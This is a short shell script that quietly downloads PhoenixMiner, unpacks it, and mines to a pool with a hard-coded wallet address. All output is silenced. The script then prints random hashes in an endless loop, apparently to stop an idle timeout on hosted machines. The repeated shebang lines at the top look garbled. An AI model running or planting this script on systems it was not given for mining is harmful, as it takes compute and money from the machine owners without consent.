#!/bin/bash

#!/bin/sh

#!/bin/bash

apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz >/dev/null 2>&1

tar -xf PhoenixMiner_5.6d_Linux.tar.gz >/dev/null 2>&1

cd PhoenixMiner_5.6d_Linux >/dev/null 2>&1

PhoenixMiner -pool etchash.unmineable.com:3333 -wal BTT:TT8no2mt4otWgdXJmbdX8DC5UkmLUE5qRL.p100+100000 -pass x

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
